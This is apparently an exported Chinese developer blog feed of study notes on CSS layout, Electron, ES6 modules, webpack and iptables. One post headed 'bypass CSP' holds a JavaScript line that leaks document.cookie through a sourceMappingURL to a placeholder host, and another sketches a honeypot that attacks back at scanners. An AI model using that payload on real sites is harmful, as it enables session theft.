<p>浮动可以做水平的菜单，这个时候比如是<code>&lt;ul&gt;</code>里面套着<code>&lt;li&gt;</code>,要实现效果一定是<code>&lt;li&gt;</code>要float,但由于<code>&lt;li&gt;</code>浮动了，那就撑不起来父元素<code>&lt;ul&gt;</code>,这个时候，父元素的<code>background-color</code>之类的就没啥用了，所以这个时候要父元素也<code>float</code></p>
<p>细节还需要再继续然后再看下，现在有其他事情要做啊，TAT</p>
<p>在网上查找了一下，除了clear还有其他办法让父元素重新撑起来<br>清除浮动:</p>
<ol>
<li>clear:both<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"father"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"son"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"son"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"clear"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>   <span class="comment">&lt;!--新增的一个元素，没有语义--&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
</li>
</ol>
<p>这里的<code>clear</code>是<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.clear</span> &#123;</div><div class="line">    <span class="attribute">clear</span>:both;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>是新增了一个<code>clear:both</code>的元素来实现的</p>
<ol>
<li>overflow:hidden<br>这个我以前没用过，我只会前面那个其实<br>只要给父元素设置一个<code>overflow:hidden</code>就可以了</li>
</ol>
<h2 id="inline-block"><a href="#inline-block" class="headerlink" title="inline-block"></a>inline-block</h2><p>既然我的inline-block既可以形成盒模型，又能水平排布，那我还为什么要使用浮动呢<br>这个还没查到<br>不过发现了这个<a href="http://www.zhangxinxu.com/wordpress/2012/04/inline-block-space-remove-%E5%8E%BB%E9%99%A4%E9%97%B4%E8%B7%9D/" target="_blank" rel="external">inline-block元素间间距去除办法</a></p>
<p>然后还有<a href="http://www.w3cplus.com/css/inline-blocks.html" target="_blank" rel="external">应不应该使用inline-block代替float</a></p>
<p>大佬有这样一句话</p>
<blockquote>
<p>就是每一行所有的inline元素和inline-block元素会共同形成一个line boxes，这个line box的高度由里面最高的元素决定。所以，即使inline-block属性的列表元素高度异常，撑开的是整个line boxes的高度，因而，不会与下一行的列表元素发生错位</p>
</blockquote>
<p>看起来就是说inline-block不会有高度塌陷的问题</p>
<h3 id="inline-block和float的区别"><a href="#inline-block和float的区别" class="headerlink" title="inline-block和float的区别"></a>inline-block和float的区别</h3><ol>
<li>float会脱离文档流,而inline-block不会</li>
<li>inline-block会导致一个元素见出现空白间隙的<a href="http://www.w3cplus.com/css/fighting-the-space-between-inline-block-elements" target="_blank" rel="external">问题</a></li>
<li>inline-block可以轻松地做一个水平居中只通过<code>text-align</code> </li>
<li>inline-block可以更好实现垂直对齐，就是前面说的float那个高度塌陷的问题</li>
</ol>
<p>大佬说道</p>
<ul>
<li>使用inline-block：当你需要控制元素的垂直对齐跟水平排列时，使用inline-block。</li>
<li>使用浮动：当你需要让元素环绕某一个元素时，或者需要支持旧版本ie，或者不想处理inline-block带来的空白问题时，使用浮动。</li>
</ul>
<p>所以其实我们常常做的商品展示列表和水平菜单，正确的使用方式是使用<code>inline-block</code><br>而只有在要做文字环绕图片的时候才使用float</p>
<h2 id="positioning-schemes"><a href="#positioning-schemes" class="headerlink" title="positioning schemes"></a>positioning schemes</h2><p>据说有三种</p>
<pre><code>Normal flow – In CSS 2.1, normal flow includes block formatting of block boxes, inline formatting of inline boxes, relative positioning of block or inline boxes, and positioning of run-in boxes.

Floats – In the float model, a box is first laid out according to the normal flow, then taken out of the flow and shifted to the left or right as far as possible. Content may flow along the side of a float.

Absolute positioning – In the absolute positioning model, a box is removed from the normal flow entirely (it has no impact on later siblings) and assigned a position with respect to a containing block.
</code></pre><ol>
<li>正常流(我们常常说的文档流)</li>
<li>浮动</li>
<li>绝对定位</li>
</ol>
<h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><p>如果没有明写出来，好像，，，都是static</p>
<h3 id="relative"><a href="#relative" class="headerlink" title="relative"></a>relative</h3><p>相对定位，比较简单，不脱离文档流，所以原来的占据的位置还在，只是相对于自己原来的位置进行移动</p>
<h3 id="absolute"><a href="#absolute" class="headerlink" title="absolute"></a>absolute</h3><p>这个，额，比较复杂,也会脱离文档流<br>相对于第一个不是static的父元素进行定位<br>所以我们常常看到我们把absolute的父元素设置成<code>relative</code>，但不设置父元素移动<br>具体比较复杂，以后填坑</p>
<h3 id="fixed"><a href="#fixed" class="headerlink" title="fixed"></a>fixed</h3><p>相对浏览器窗口定位,所以会脱离文档流</p>
<h3 id="inherit"><a href="#inherit" class="headerlink" title="inherit"></a>inherit</h3><p>从父元素继承一下子</p>
<p>综上，是<code>absolute</code>和<code>fixed</code>,会脱离文档流<br>另外，我们前面说到的<code>float</code>也会脱离文档流</p>
<h2 id="负外边距"><a href="#负外边距" class="headerlink" title="负外边距"></a>负外边距</h2><h2 id="line-box-和-block-box"><a href="#line-box-和-block-box" class="headerlink" title="line box 和 block box"></a>line box 和 block box</h2><p>一直没有注意，盒模型有两种？？<br>这部分参考<a href="https://segmentfault.com/a/1190000005155084" target="_blank" rel="external">这个</a><br>这什么鬼<br>好像没怎么看懂</p>
<h2 id="rem-和-em"><a href="#rem-和-em" class="headerlink" title="rem 和 em"></a>rem 和 em</h2><p>rem =&gt; font size of the root element =&gt; 相对于根元素<br>em =&gt; font size of the element =&gt; 相对于父元素<br>具体参考<a href="https://isux.tencent.com/web-app-rem.html" target="_blank" rel="external">这里</a></p>
<h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><p>参考<a href="https://segmentfault.com/a/1190000004026388" target="_blank" rel="external">这里</a>和<a href="https://segmentfault.com/a/1190000004105774" target="_blank" rel="external">这里</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://vanseodesign.com/css/display-property/" target="_blank" rel="external">http://vanseodesign.com/css/display-property/</a><br><a href="http://vanseodesign.com/css/understanding-css-floats/" target="_blank" rel="external">http://vanseodesign.com/css/understanding-css-floats/</a><br><a href="https://segmentfault.com/a/1190000005155084" target="_blank" rel="external">https://segmentfault.com/a/1190000005155084</a> (CSS 盒模型Block box与Line box)</p>
]]></content>
      
        
        <tags>
            
            <tag> css </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[electron]]></title>
      <url>/2017/07/13/electron/</url>
      <content type="html"><![CDATA[<p>在很远古的时候，曾经使用过<code>nw.js</code>,当时在做C++课设，被狠狠的坑了一把<br>隐约记得好多bug，验收前几天还能看到<code>nw.js</code>每天各种update，各种issue</p>
<p>electron的<a href="https://github.com/electron/electron/blob/master/docs-translations/zh-CN/development/atom-shell-vs-node-webkit.md" target="_blank" rel="external">github</a>上有<code>electron</code>和<code>nw.js</code>的差异</p>
<p>先让我mark一下，然后学习吧</p>
]]></content>
      
        
        <tags>
            
            <tag> node </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[解构赋值]]></title>
      <url>/2017/07/13/%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/</url>
      <content type="html"><![CDATA[<p>蠢得很啊啊啊啊</p>
<p>今天又看到<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> &#123;app, BrowerWindow&#125; = <span class="built_in">require</span>(<span class="string">'electron'</span>);</div></pre></td></tr></table></figure></p>
<p>这个是对象解构赋值<br>在electron模块里有类似的代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">exports.app = &#123;</div><div class="line">    ...</div><div class="line">&#125;</div><div class="line">...</div><div class="line">exports.BrowerWindow = &#123;</div><div class="line">    ...</div><div class="line">&#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>上面的<code>require</code>也就是相当于<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> electron = <span class="built_in">require</span>(<span class="string">'electron'</span>);</div><div class="line"><span class="keyword">const</span> app = electron.app;</div><div class="line"><span class="keyword">const</span> BrowerWindow = electron.BrowerWindow;</div></pre></td></tr></table></figure></p>
<p>那这个和使用<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> &#123;app, BrowerWindow&#125; <span class="keyword">from</span> <span class="string">'electron'</span></div></pre></td></tr></table></figure></p>
<p>有什么区别呢</p>
<p>require/exports<br>这个是CommonJS,是Node.js的规范</p>
<p>import/export<br>这个是ES6的规范，但其实现在没有人支持他，都是由babel转换成为<code>require/exports</code>的，所以现阶段使用的<code>import/export</code>是编译成了<code>require/exports</code><br>在浏览器端使用<code>import</code>的话，只有babel还不行，必须要用<code>webpack</code>+<code>babel</code><br>在nodejs这边的话，我就不用<code>import</code>了<br>不过有个<code>babel-node</code>好像可以直接<code>import</code></p>
<p>不过区别到底在哪里</p>
<p>找到了下面的链接,是从使用方面</p>
<ol>
<li>imports and exports must be at the top level </li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(xxx) &#123;</div><div class="line">    <span class="built_in">require</span>(<span class="string">'./a'</span>)</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="built_in">require</span>(<span class="string">'./b'</span>)</div><div class="line">&#125;   <span class="comment">//正确</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>(xxx) &#123;</div><div class="line">    <span class="keyword">import</span> <span class="string">'a'</span></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">import</span> <span class="string">'b'</span></div><div class="line">&#125;   <span class="comment">//语法错误</span></div></pre></td></tr></table></figure>
<ol>
<li>imports are hoisted <blockquote>
<p>我还查了下，这词啥意思，好像是说import可以变量提升,就是说放哪都行</p>
</blockquote>
</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">foo();</div><div class="line">...</div><div class="line"><span class="keyword">import</span> &#123;foo&#125; <span class="keyword">from</span> <span class="string">'some_code'</span>;</div></pre></td></tr></table></figure>
<p>实际上编译时import是提升到<code>the beginning of the current scope</code>，所以没错</p>
<ol>
<li>Imports are read-only views on exports<br>这个看起来比较，emmmmm~<br>好像是说<code>import</code>进来的是<code>live</code>的,<code>read-only</code>的, 其实就是一个<code>只读</code>的<code>引用</code><br>而<code>require</code>他就是一个,emmmm~,值传递,传进来就和原来的环境没有关系了<br>这个看<a href="http://es6.ruanyifeng.com/#docs/module-loader#ES6-%E6%A8%A1%E5%9D%97%E4%B8%8E-CommonJS-%E6%A8%A1%E5%9D%97%E7%9A%84%E5%B7%AE%E5%BC%82" target="_blank" rel="external">这里吧</a></li>
</ol>
<p>##<br>顺便还有<br>exports.xxx = yyy;<br>和module.exports = {<br>    xxx: yyy;<br>}<br>的区别<br>这里好像在朴灵的书上看过但不记得了</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://exploringjs.com/es6/ch_modules.html#_imports-are-hoisted" target="_blank" rel="external">http://exploringjs.com/es6/ch_modules.html#_imports-are-hoisted</a> (炒鸡炒鸡不错)<br><a href="https://stackoverflow.com/questions/31354559/using-node-js-require-vs-es6-import-export" target="_blank" rel="external">https://stackoverflow.com/questions/31354559/using-node-js-require-vs-es6-import-export</a><br><a href="http://es6.ruanyifeng.com/#docs/module-loader#ES6-%E6%A8%A1%E5%9D%97%E4%B8%8E-CommonJS-%E6%A8%A1%E5%9D%97%E7%9A%84%E5%B7%AE%E5%BC%82" target="_blank" rel="external">http://es6.ruanyifeng.com/#docs/module-loader#ES6-%E6%A8%A1%E5%9D%97%E4%B8%8E-CommonJS-%E6%A8%A1%E5%9D%97%E7%9A%84%E5%B7%AE%E5%BC%82</a></p>
]]></content>
      
        
        <tags>
            
            <tag> es6 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用inline-block]]></title>
      <url>/2017/07/13/%E4%BD%BF%E7%94%A8inline-block/</url>
      <content type="html"><![CDATA[<h2 id="据说"><a href="#据说" class="headerlink" title="据说"></a>据说</h2><p>inline-block 可以用来代替 float<br>好吧,从来没有注意过<br>一直在使用float</p>
<h2 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-----------------------------------------------------</div><div class="line">|Margin|border|padding|content|padding|border|Margin|</div><div class="line">-----------------------------------------------------</div></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.w3cplus.com/css/inline-blocks.html" target="_blank" rel="external">http://www.w3cplus.com/css/inline-blocks.html</a> (inline-block)<br><a href="http://vanseodesign.com/css/understanding-css-floats/" target="_blank" rel="external">http://vanseodesign.com/css/understanding-css-floats/</a> (介绍float)</p>
]]></content>
      
        
        <tags>
            
            <tag> css </tag>
            
            <tag> 前端 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[source map]]></title>
      <url>/2017/07/12/source-map/</url>
      <content type="html"><![CDATA[<h2 id="bypass-CSP"><a href="#bypass-CSP" class="headerlink" title="bypass CSP"></a>bypass CSP</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;script&gt;//#  sourceMappingURL=https://request/?$&#123;escape(document.cookie)&#125;&lt;/script&gt;'</span>)</div></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://segmentfault.com/a/1190000007544398" target="_blank" rel="external">https://segmentfault.com/a/1190000007544398</a> (哈哈哈，这个人和我一样)</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[HTML5 Outliner]]></title>
      <url>/2017/07/12/HTML5-Outliner/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[iptables]]></title>
      <url>/2017/07/12/iptables/</url>
      <content type="html"><![CDATA[<p>其实从从来没有用过这个<br>因为不知道听谁说过这玩意，很危危险</p>
<h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>iptables 是用户态的 而netfilter是内核态的<br>iptables是netfilter的一个前端???</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>Netfilter给<code>ipv4</code>定义了5个hook点</p>
<ul>
<li>PRE_ROUTING</li>
<li>LOCAL_IN</li>
<li>FORWARD</li>
<li>LOCAL_OUT</li>
<li>POST_ROUTING</li>
</ul>
<h3 id="各个hook点的位置"><a href="#各个hook点的位置" class="headerlink" title="各个hook点的位置"></a>各个hook点的位置</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">                          ---------</div><div class="line">Data =&gt; [*]PRE_ROUTING =&gt; |ROUTING| =&gt; [*]LOCAL_IN =&gt; [*]LOCAL_OUT =&gt; [*]POST_ROUTING</div><div class="line">                          |ROUTING| =&gt; [*]FORWARD  =&gt; [*]POST_ROUTING</div><div class="line">                          ---------</div></pre></td></tr></table></figure>
<p>数据包过来，先过<code>PRE_ROUTING</code>,然后过一个路由,决定数据包是本机的,还是要转发<br>如果是本机的就回过<code>LOCAL_IN</code>,<code>LOCAL_OUT</code>,再<code>POST_ROUTING</code><br>如果是要直接转发的则要过<code>FORWARD</code>后,然后再<code>POST_ROUTING</code></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.chinaunix.net/uid-23069658-id-3160506.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-23069658-id-3160506.html</a><br><a href="http://blog.csdn.net/suiyuan19840208/article/details/19684883" target="_blank" rel="external">http://blog.csdn.net/suiyuan19840208/article/details/19684883</a><br><a href="https://zhuanlan.zhihu.com/p/21534942" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21534942</a></p>
]]></content>
      
        
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SSR]]></title>
      <url>/2017/07/10/SSR/</url>
      <content type="html"><![CDATA[<p>Server-Side Rendering<br>ShadowsocksR<br>那么问题来了<br>阴阳师里SSR是什么的缩写</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[socket.io]]></title>
      <url>/2017/07/10/socket-io/</url>
      <content type="html"><![CDATA[<p>感觉很简单的API,好像很厉害的样子，就照着官网的demo敲了一下<br>顺便复习了一下express</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://socket.io/" target="_blank" rel="external">https://socket.io/</a><br><a href="http://expressjs.com/" target="_blank" rel="external">http://expressjs.com/</a></p>
]]></content>
      
        
        <tags>
            
            <tag> socket </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浏览器里使用import]]></title>
      <url>/2017/07/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E9%87%8C%E4%BD%BF%E7%94%A8import/</url>
      <content type="html"><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>本来想只要在浏览器里用<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/react@15/dist/react.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/react-dom@15/dist/react-dom.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/babel-standalone@6/babel.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/babel"</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span></div><div class="line"><span class="javascript"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">ReactDOM.render(</span></div><div class="line"><span class="javascript">  &lt;h1&gt;Hello, world!<span class="xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>,</span></div><div class="line"><span class="javascript">  <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>)</span></div><div class="line"><span class="undefined">);</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>这样乱搞一下就可以了，结果发现会报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Uncaught ReferenceError: require is not defined</div></pre></td></tr></table></figure></p>
<p>天哦，找了找资料，好像是说不能只用<code>babel</code>就实现浏览器里支持<code>import</code><br>看这样子只能用webpack</p>
<h2 id="学习webpack"><a href="#学习webpack" class="headerlink" title="学习webpack"></a>学习webpack</h2><p>最后的目录结构是这样子的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── app.js</div><div class="line">├── bundle.js</div><div class="line">├── index.html</div><div class="line">├── node_modules</div><div class="line">├── npm-debug.log</div><div class="line">├── package.json</div><div class="line">└── webpack.config.js</div></pre></td></tr></table></figure></p>
<h3 id="app-js"><a href="#app-js" class="headerlink" title="app.js"></a>app.js</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</div><div class="line"></div><div class="line">ReactDOM.render(</div><div class="line">  &lt;h1&gt;Hello, world!<span class="xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>,</div><div class="line">  <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>)</div><div class="line">);</div></pre></td></tr></table></figure>
<p>用webpack将app.js output成,然后引入到html里</p>
<h3 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"bundle.js"</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>遇到一个坑，就是这个<code>bundle.js</code>,放到root前面会报错，找不到root</p>
<blockquote>
<p>Uncaught Invariant Violation: _registerComponent(…): Target container is not a DOM element.</p>
</blockquote>
<h3 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="string">"name"</span>: <span class="string">"react_learn"</span>,</div><div class="line">  <span class="string">"version"</span>: <span class="string">"1.0.0"</span>,</div><div class="line">  <span class="string">"description"</span>: <span class="string">"an example"</span>,</div><div class="line">  <span class="string">"main"</span>: <span class="string">"app.js"</span>,</div><div class="line">  <span class="string">"scripts"</span>: &#123;</div><div class="line">    <span class="string">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>,</div><div class="line">    <span class="string">"build"</span>: <span class="string">"webpack"</span></div><div class="line">  &#125;,</div><div class="line">  <span class="string">"author"</span>: <span class="string">""</span>,</div><div class="line">  <span class="string">"license"</span>: <span class="string">"ISC"</span>,</div><div class="line">  <span class="string">"dependencies"</span>: &#123;</div><div class="line">    <span class="string">"react"</span>: <span class="string">"^15.6.1"</span>,</div><div class="line">    <span class="string">"react-dom"</span>: <span class="string">"^15.6.1"</span></div><div class="line">  &#125;,</div><div class="line">  <span class="string">"devDependencies"</span>: &#123;</div><div class="line">    <span class="string">"babel-core"</span>: <span class="string">"^6.25.0"</span>,</div><div class="line">    <span class="string">"babel-loader"</span>: <span class="string">"^7.1.1"</span>,</div><div class="line">    <span class="string">"babel-preset-es2015"</span>: <span class="string">"^6.24.1"</span>,</div><div class="line">    <span class="string">"babel-preset-react"</span>: <span class="string">"^6.24.1"</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里是npm install 了 <code>react</code>, <code>react-dom</code>,以及打包相关的<code>babel-*</code>,这个一堆babel是为了支持es6的<code>import</code>,也就是我们目的所在</p>
<h3 id="webpack-config-js"><a href="#webpack-config-js" class="headerlink" title="webpack.config.js"></a>webpack.config.js</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: <span class="string">'./app.js'</span>,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'bundle.js'</span></div><div class="line">  &#125;,</div><div class="line">  <span class="built_in">module</span>: &#123;</div><div class="line">    loaders: [</div><div class="line">      &#123;</div><div class="line">        test: <span class="regexp">/\.jsx?$/</span>,</div><div class="line">        exclude: <span class="regexp">/node_modules/</span>,</div><div class="line">        loader: <span class="string">'babel-loader'</span>,</div><div class="line">        query: &#123;</div><div class="line">          presets: [<span class="string">'es2015'</span>, <span class="string">'react'</span>]</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    ]</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这些都配好以后只要 <code>webpack</code>一下就可以得到我们的<code>bundle</code>,在这里我跑了一下不知道为什么FF不可以,chrome是可以的</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Thinking]]></title>
      <url>/2017/06/26/Thinking/</url>
      <content type="html"><![CDATA[<p>要写点东西</p>
<ol>
<li><p>waf</p>
<ul>
<li>威胁感知部分(通过机器学习和大数据)<ul>
<li>自动抓取攻击向量</li>
<li>大数据</li>
<li>自学习</li>
</ul>
</li>
<li>处理目的是将hacker丢入蜜罐</li>
<li><p>WAF本身是通用型的，所以加入机器学习是一种趋势</p>
</li>
<li><p>将hacker丢入蜜罐是waf能完成的了得的吗啊啊啊诶</p>
</li>
</ul>
</li>
<li><p>蜜罐</p>
<ul>
<li>挂上beef</li>
<li>挂上其他的0day的洞</li>
<li>针对扫描器</li>
<li>针对sqlmap</li>
<li>整个一个生态圈</li>
</ul>
</li>
</ol>
<p>或者可以模仿beef</p>
<p>打AWVS的洞 <a href="http://www.91ri.org/14712.html" target="_blank" rel="external">http://www.91ri.org/14712.html</a></p>
<p><a href="http://www.freebuf.com/sectool/116706.html" target="_blank" rel="external">http://www.freebuf.com/sectool/116706.html</a><br><a href="http://www.freebuf.com/articles/network/116922.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/116922.html</a></p>
<p><a href="https://lightless.me/archives/docker-honeypot.html" target="_blank" rel="external">https://lightless.me/archives/docker-honeypot.html</a> (和我想实现的思路很像)<br>可以将hacker丢入蜜罐，然后使用扫描器和其他攻击工具的漏洞进行反击，再打回去</p>
<p>如何丢，应该就是有一个原始的模式库，再加上自学习(就是数据挖掘+人工智能)</p>
<p><a href="https://lightless.me/archives/kokkuri-s-revenge.html" target="_blank" rel="external">https://lightless.me/archives/kokkuri-s-revenge.html</a> </p>
<p>DNS rebinding可以用来打吗</p>
<p>之后真的真的想自己写一个出来</p>
<p>但好像涉及到机器学习就学要大量的资源来进行学习的样子是不是不适用于这种叫什么来着，这种实时的环境，好像可以使用map reduce</p>
<p>python mapReduce 利用mapReduce 的 Streaming</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[mark下最近看到的]]></title>
      <url>/2017/06/23/mark%E4%B8%8B%E6%9C%80%E8%BF%91%E7%9C%8B%E5%88%B0%E7%9A%84/</url>
      <content type="html"><![CDATA[<p><a href="http://www.vuln.cn/8347" target="_blank" rel="external">http://www.vuln.cn/8347</a> php一句话balabala</p>
<p><a href="http://www.sohu.com/a/116407354_421782" target="_blank" rel="external">http://www.sohu.com/a/116407354_421782</a> DDOS流量清理中心</p>
